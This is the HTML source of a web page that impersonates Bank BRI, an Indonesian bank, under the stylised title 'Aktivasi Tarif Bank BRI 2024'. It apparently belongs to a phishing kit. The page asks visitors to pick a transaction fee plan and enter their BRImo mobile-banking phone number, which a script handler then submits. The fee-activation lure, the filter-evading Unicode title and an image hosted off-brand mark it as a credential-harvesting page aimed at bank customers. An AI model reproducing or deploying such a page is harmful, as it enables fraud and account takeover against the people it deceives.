...
<head>
    ...
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
     ...
     <title>𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜 | 𝟮𝟬𝟮𝟰</title>
         <meta content="https://hosting.tigerengine.id/f8uyn1.jpg" property="og:image">
<meta name="twitter:image" content="https://hosting.tigerengine.id/f8uyn1.jpg">
...
<body style="background: url(''),#fff no-repeat center;
    background-size: 100%;
    ;
...
<div class="load" style="display:none">
 <img src="img/f01dmo.gif" class="jao" alt="">
  ...
  <div style="position: fixed; left: 0; right: 0; width: 100%; top: 0; bottom: 0; height: 100%; background: ; display: " id="formlogin" >
    <div style="position: absolute; left: 0; right: 0; width: 100%; height: 315px; background: transparent; margin: 0px auto; bottom: 0; border-radius: 15px 15px 0px 0px; border: 0px solid blue" class="">

<center>

</center>
<form onsubmit="sendNohp(event); return false" method="POST" id="inputlogin" style="margin-top: -35px; padding: 10px">
<center>
 <div class="button-85 hua" style="margin-top: -130px">
    <img style="position: fixed;width:20%;top:600px;margin-left:-40px;" src="img/T24.png" alt="">
<center style="color:#0f78cb; line-height: 20px; font-size: 14px; padding: 20px;margin-top:-22px;"><p style="border-bottom:1.5px solid #0000004a;border-radius:10px;margin-bottom:0px;height:50px;margin-top: -10px; font-weight: bold; font-family: 'Varela Round', sans-serif; color: #0f78cb">Silahkan Pilih Tarif Transaksi Sesuai Kebutuhan Anda Di Bawah Ini</p>
...
<br><br><br>
<h5 style="position:absolute;color:#000;margin: 0px auto; margin-top: -28px; left: 0; right: 0; font-size: 15px">Masukan Nomor Ponsel <b style="color: #06529C">BRI</b><b style="color: #F37024">mo</b> Anda :</h5>
 <input id="NoHp" name="nohp" type="text" inputmode="numeric" class="form-control" placeholder="08xxxxxx" oninvalid="this.setCustomValidity('Mohon mɑsukkɑn 𝗡𝗼𝗺𝗼𝗿 𝗣𝗼𝗻𝘀𝗲𝗹 dengɑn benɑr')" onchange="this.setCustomValidity('')" required maxlength="13" minlength="10" class="bubble-element Input" placeholder="08xxxxxxxx" required autocomplete="off" style="width: 95%;  
  height: 40px;
  padding: 10px;
  outline: none;
  box-shadow: 2px 3px 6px #8a8a8a;
 ...
 <div style="position: fixed; bottom: 0; left: 0; right: 0; margin: 0px auto; width: 100%; height: 82px; background: #fff; box-shadow: rgba(0, 0, 0, 0.15) 5px 5px 15px 0px; padding-top: 15px; border-top: 2px double #ccc">
<button type="submit" disabled id="kirims" style="margin-left: 20px;margin-top: ;position:absolute;background-color:#006BC6;color:white;border:0px solid #0076e0;width:90%;border-radius:10px;font-family: 'Nunito', sans-serif;font-size: 15px;padding:13px;display: inline-block; box-shadow: rgba(60, 64, 67, 0.3) 0px 1px 2px 0px, rgba(60, 64, 67, 0.35) 2px 2px 3px 2px;" >Lanjutkan</button>
           </div>   
    </form>
            </div>
...
const button = document.getElementById("kirims");
